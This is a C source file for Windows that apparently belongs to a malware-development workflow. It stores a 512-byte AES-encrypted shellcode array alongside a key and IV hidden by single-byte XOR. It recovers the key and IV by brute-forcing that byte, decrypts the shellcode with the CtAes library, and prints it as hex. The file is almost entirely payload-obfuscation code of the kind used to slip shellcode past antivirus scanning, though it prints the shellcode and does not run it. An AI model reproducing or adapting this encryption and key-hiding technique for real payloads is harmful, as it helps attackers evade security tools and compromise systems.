#include <Windows.h>
#include <stdio.h>
#include "CtAes.h"

unsigned char AesKey[32] =
"\xf5\x10\x80\x93\x02\xf6\x66\x2d\x1f\x79\xfb\x0b\x31\x9c\x49\x38"
"\xd4\x51\x5a\x49\x35\x6d\x35\x5e\x30\x98\xb6\x36\x38\xce\x85\x90";

unsigned char AesIv[16] =
"\xa7\xd6\x5e\x60\x9d\xe6\x2e\xcc\xa2\x4c\xf1\x6d\x22\x78\x68\xaf";

unsigned char Shellcode[512] =
"\xb5\x1f\x84\x97\xdb\xa7\xf9\x7c\x55\x8f\x3d\x50\x9a\x7c\xbb\xc7"
"\x1a\x73\x4c\xec\x46\x2f\x02\x97\xcb\x5c\x41\xab\x01\xae\xbe\xd6"
"\x65\xb6\x29\x13\x47\x5d\x6c\x6d\x43\x74\x9c\xa5\x9f\xd8\xfc\x94"
"\xb2\xec\x60\x81\x30\xe7\xf3\x0d\xed\x4c\x20\x04\x4e\x63\x74\x55"
"\x73\x18\x9c\x74\x2e\x1e\x2a\xd7\x92\x09\x09\x40\x89\x5e\x46\x36"
"\x97\x8c\x55\x73\xa4\xa9\xce\x69\xbe\x2d\x21\x9b\xf2\x96\x02\xec"
"\x59\xdf\x08\xed\xc6\xea\x96\x49\x9a\x62\xe3\x60\x3f\x8c\x06\x6e"
"\x33\xbe\x9b\xb2\x9d\x3f\x70\x14\x17\x9e\xfe\xb3\xa9\x6b\x6e\x00"
"\x8b\x1e\x55\xba\xd7\x90\xfc\x58\xb7\x24\x57\xcd\xda\xed\xaf\x7c"
"\xee\x01\xc9\xb0\xb6\xf0\x14\xf8\x21\x1d\xe0\x61\x37\x6f\x32\x46"
"\xaf\x20\x5a\xa2\xdb\xa4\xae\x54\xe2\x92\xb7\xe9\x0e\x0a\x54\x76"
"\x6b\xcd\x01\x8e\xe2\xce\xbd\x4b\xfd\x45\xfc\x4d\xf7\xcc\xda\xf0"
"\x03\x1d\x9d\xa1\x3d\x34\xf8\xc8\xff\x48\xfb\x47\x3b\xdc\xaf\x41"
"\x4c\x45\x56\x2c\x3f\x37\x43\x12\xf2\x5d\xad\x2c\x67\xb4\x25\x8b"
"\xce\xac\xee\xaf\xe0\xda\xb4\xee\xd7\x0d\xf8\xb7\xc5\xf4\x75\xae"
"\xa3\x23\x98\x61\x85\x19\x70\x4e\x06\xce\x82\x0b\x3f\x29\x46\xf1"
"\x56\xf4\xf7\x2a\x9a\xb4\xb2\xfd\x3b\x54\x28\x60\xc7\x90\xad\x25"
"\xe3\xe3\x72\x5e\x74\xad\xab\x24\x14\x9f\xc4\x9a\x2c\xa4\x3f\x59"
"\xe6\xd8\xa1\x5d\xc3\x33\x81\x59\xad\xa1\x2e\xb8\xf6\x31\x91\x47"
"\x16\xdd\x23\x38\xea\x0f\xa1\x28\x0e\xc1\x6c\x4a\x9c\x3b\x2c\x76"
"\x65\xdf\x21\x9f\x80\x3b\xe4\x9e\xe9\x42\xed\xdd\xb5\x96\x49\x29"
"\xe0\x4c\x24\x67\x06\x00\x50\x53\xa1\x48\x9a\x7f\xf7\xb1\xb6\x00"
"\x2b\x12\xe6\x00\xf9\x08\x89\x35\x27\xc9\xab\x2e\x48\x66\xe4\xdb"
"\x9a\x98\x55\x5a\x36\x7b\xd7\xe0\x97\xa4\xf5\x8b\xba\xf2\x94\xe2"
"\x19\xea\x36\xa4\xc8\x03\x69\xe4\x6e\xf9\xcd\xd9\xc4\xf1\x20\xd1"
"\x7d\x77\xf0\x6f\x4b\x4d\x5d\xe0\x7f\x9a\xe3\xdc\x55\x25\x89\x54"
"\x02\xc4\xd4\xd9\x80\xa1\x22\xf7\x4f\x74\x44\x8b\xbe\x83\x63\xf7"
"\x34\x16\x57\x2c\x28\x37\xf7\x38\x03\xaa\x71\x7e\x6c\x2b\xa6\xc3"
"\xde\x13\x9c\x56\xfe\x44\x87\x4f\xb8\xaf\xee\x86\xcb\x6e\x08\xb1"
"\x3c\x04\x62\xf6\x59\x26\x09\x18\x48\xdc\x87\x18\xdb\x7f\x91\xad"
"\x73\xc8\xf3\xf9\x14\x36\xb8\x08\xc3\xf2\x82\x30\x3a\x55\xcb\x1f"
"\xe0\xc4\x21\xe7\xea\x68\x44\xd1\xed\xd5\x57\x27\x2b\x2e\x02\x53";

BYTE BruteForceDecryptionKey(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {
    int i = 0x00;
    for (i = 0; i <= 0xFF; i++) {
        if (((pKeyArray[1] ^ i) % 0xFF) == 0x53) {
            break;
        }
    }

    for (int x = 0; x < sKeySize; x++)
        pKeyArray[x] = pKeyArray[x] ^ i;
    return i;
}

BYTE BruteForceDecryptionIv(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {
    int i = 0x00;
    for (i = 0; i <= 0xFF; i++) {
        if (((pKeyArray[1] ^ i) % 0xFF) == 0x03) {
            break;
        }
    }

    for (int x = 0; x < sKeySize; x++)
        pKeyArray[x] = pKeyArray[x] ^ i;
    return i;
}

BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppPlainTextBuffer, OUT SIZE_T* pPlainTextSize) {

    AES256_CBC_ctx	AesCtx = { 0x00 };

    if (!pCipherTextBuffer || !sCipherTextSize || !ppPlainTextBuffer || !pAesKey || !pAesIv)
        return FALSE;

    if (!(*ppPlainTextBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCipherTextSize))) {
        printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
    AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
    AES256_CBC_decrypt(&AesCtx, (sCipherTextSize / 16), *ppPlainTextBuffer, pCipherTextBuffer);

    *pPlainTextSize = sCipherTextSize;

    return TRUE;
}

void PrintHexString(const unsigned char* buffer, size_t bufferSize) {
    for (size_t i = 0; i < bufferSize; ++i) {
        if (i % 16 == 0) {
            if (i > 0) {
                printf("\"\n");
            }
            printf("\"");
        }
        printf("\\x%02x", buffer[i]);
    }
    printf("\";\n");
}

int main() {

    PBYTE DecryptedShellcode = NULL;
    SIZE_T DecryptedSize = 0;

    BruteForceDecryptionKey(AesKey, 32);
    BruteForceDecryptionIv(AesIv, 16);

    if (!InstallAesDecryptionViaCtAes(Shellcode, sizeof(Shellcode), AesKey, AesIv, &DecryptedShellcode, &DecryptedSize)) {
        return -1;
    }

    PrintHexString(DecryptedShellcode, DecryptedSize);

}